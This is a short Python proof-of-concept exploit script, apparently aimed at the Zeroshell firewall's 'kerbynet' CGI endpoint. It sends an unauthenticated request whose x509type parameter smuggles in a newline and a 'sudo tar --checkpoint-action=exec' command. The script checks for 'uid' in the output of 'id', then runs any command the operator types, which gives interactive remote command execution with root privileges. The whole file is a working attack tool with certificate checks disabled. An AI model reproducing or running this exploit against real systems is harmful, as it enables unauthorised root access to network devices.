import re
import requests
import ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def poc():
    url = "https://x.x.x.x"
    poc_payload = """/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d"id"%0A'"""
    try:
        res = requests.get(url + poc_payload, verify=False)
        if res.status_code == 200 and 'uid' in res.text:
            print("[+] Bingo! We Got it!")
            cmd = input("Input commond$ ")
            exp_payload = poc_payload.replace("id",cmd)
            res = requests.get(url + exp_payload, verify=False)
            key = res.text.split("<")[0]
            print(key)
        else:
            print("[-] Sorry! We Don't have it!")
    except Exception as e:
        print("[-] There is somting wrong with connecting...")
        print(e)


if __name__ == "__main__":
    poc()